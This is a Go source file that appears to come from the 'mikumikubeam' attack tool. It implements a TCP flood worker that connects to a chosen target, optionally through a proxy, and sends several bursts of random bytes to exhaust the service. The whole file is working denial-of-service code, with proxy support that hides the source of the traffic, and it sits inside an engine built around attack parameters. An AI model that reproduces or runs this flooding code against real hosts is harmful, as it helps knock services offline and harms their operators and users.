package tcp

import (
	"context"
	"crypto/rand"
	"math/big"
	"time"

	core "github.com/sammwyy/mikumikubeam/internal/engine"
	"github.com/sammwyy/mikumikubeam/internal/netutil"
)

type floodWorker struct{}

func NewFloodWorker() *floodWorker { return &floodWorker{} }

func (w *floodWorker) Fire(ctx context.Context, params core.AttackParams, p core.Proxy, ua string, logCh chan<- core.AttackStats) error {
	tn := params.TargetNode
	host := tn.Hostname()
	port := tn.PortNum()
	if host == "" || port <= 0 {
		return nil
	}

	var pptr *core.Proxy
	if p.Host != "" {
		pptr = &p
	}
	conn, err := netutil.DialedTCPClient(ctx, "tcp", host, port, pptr)
	if err != nil {
		return nil
	}
	defer conn.Close()

	// Send log only if connection was successful and verbose is enabled
	core.SendAttackLogIfVerbose(logCh, p, params.Target, params.Verbose)

	// Write random bytes (packet-size or 512 default)
	size := params.PacketSize
	if size <= 0 {
		size = 512
	}
	buf := make([]byte, size)
	// crypto/rand for variability
	_, _ = rand.Read(buf)
	_ = conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
	_, _ = conn.Write(buf)
	// Optionally send a few bursts
	bursts := minInt(3, 1+randIntn(3))
	for i := 0; i < bursts; i++ {
		_, _ = rand.Read(buf)
		_, _ = conn.Write(buf)
	}
	return nil
}

func minInt(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func randIntn(n int) int {
	if n <= 0 {
		return 0
	}
	x, err := rand.Int(rand.Reader, big.NewInt(int64(n)))
	if err != nil {
		return 0
	}
	return int(x.Int64())
}
